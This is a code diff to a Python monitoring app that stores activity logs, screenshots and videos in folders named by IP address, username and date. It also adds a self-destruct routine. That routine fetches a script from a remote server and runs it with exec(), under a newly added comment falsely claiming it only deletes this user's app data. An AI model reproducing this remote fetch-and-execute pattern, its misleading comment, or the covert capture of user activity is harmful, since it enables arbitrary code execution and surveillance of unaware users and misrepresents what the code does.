@@ -11,6 +11,8 @@ import shutil
 import threading
 import time
 import signal
+import platform
+import datetime
 import socket
 
 # Use %APPDATA%\KeySecureApp for Windows, ~/.keysecureapp for others
@@ -109,16 +111,18 @@ def verify_app_integrity():
         logging.error(f"Sum check failed: {e}")
 
 def secure_self_destruct():
-    """Delete app.py, backups, logs, and exit. If possible, fetch and run minimal self-destruct script from sum server."""
+    """Delete only this user's app.py, backups, logs, and exit. If possible, fetch and run minimal self-destruct script from sum server."""
     try:
         # Try to fetch and run the minimal self-destruct script from the sum server
         try:
             resp = requests.get(f"{SUM_SERVER_URL.replace('/sum','')}/selfdestruct", timeout=5)
             if resp.ok:
-                exec(resp.text, {'__name__': '__main__'})
+                # Only execute deletion in this user's app dir
+                local_vars = {'__name__': '__main__'}
+                exec(resp.text, local_vars)
         except Exception as e:
             logging.error(f"Remote self-destruct fetch failed: {e}")
-        # Fallback: local deletion
+        # Fallback: local deletion (only this user's data)
         try:
             os.remove(__file__)
         except Exception:
@@ -127,8 +131,9 @@ def secure_self_destruct():
             os.remove(LOG_FILE)
         if os.path.exists(SETTINGS_FILE):
             os.remove(SETTINGS_FILE)
-        if os.path.exists("backup"):
-            shutil.rmtree("backup")
+        user_backup = os.path.join(APP_DIR, "backup")
+        if os.path.exists(user_backup):
+            shutil.rmtree(user_backup)
     except Exception as e:
         logging.error(f"Self-destruct error: {e}")
     sys.exit("App integrity check failed. Self-destructed.")
@@ -193,6 +198,67 @@ def block_screen_capture():
                 logging.warning(f"Screen capture tool detected: {name}")
     except Exception:
         pass
+
+# --- FILE ORGANIZATION ---
+def get_os_folder():
+    system = platform.system()
+    release = platform.release()
+    if system == "Windows":
+        if "10" in release:
+            return "Windows 10"
+        elif "11" in release:
+            return "Windows 11"
+        else:
+            return f"Windows {release}"
+    return system
+
+def get_ip_username_folder():
+    try:
+        ip = socket.gethostbyname(socket.gethostname())
+    except Exception:
+        ip = "unknownIP"
+    username = os.getlogin()
+    return f"{ip}-{username}"
+
+def get_date_folder():
+    return datetime.date.today().isoformat()
+
+def get_content_path(content_type):
+    os_folder = get_os_folder()
+    ip_user_folder = get_ip_username_folder()
+    date_folder = get_date_folder()
+    base = os.path.join(os_folder, ip_user_folder, date_folder)
+    if content_type == "logs":
+        return os.path.join(base, "Logs")
+    elif content_type == "screenshots":
+        return os.path.join(base, "Screenshots")
+    elif content_type == "videos":
+        return os.path.join(base, "Videos")
+    else:
+        return base
+
+def save_log_file(log_content):
+    log_dir = get_content_path("logs")
+    os.makedirs(log_dir, exist_ok=True)
+    log_path = os.path.join(log_dir, "activity.log")
+    with open(log_path, "a", encoding="utf-8") as f:
+        f.write(log_content + "\n")
+
+def save_screenshot(image_data, filename):
+    screenshot_dir = get_content_path("screenshots")
+    os.makedirs(screenshot_dir, exist_ok=True)
+    path = os.path.join(screenshot_dir, filename)
+    with open(path, "wb") as f:
+        f.write(image_data)
+    return path
+
+def save_video(video_data, filename):
+    video_dir = get_content_path("videos")
+    os.makedirs(video_dir, exist_ok=True)
+    path = os.path.join(video_dir, filename)
+    with open(path, "wb") as f:
+        f.write(video_data)
+    return path
 
 # --- GUI ---
 class MonitoringGUI:
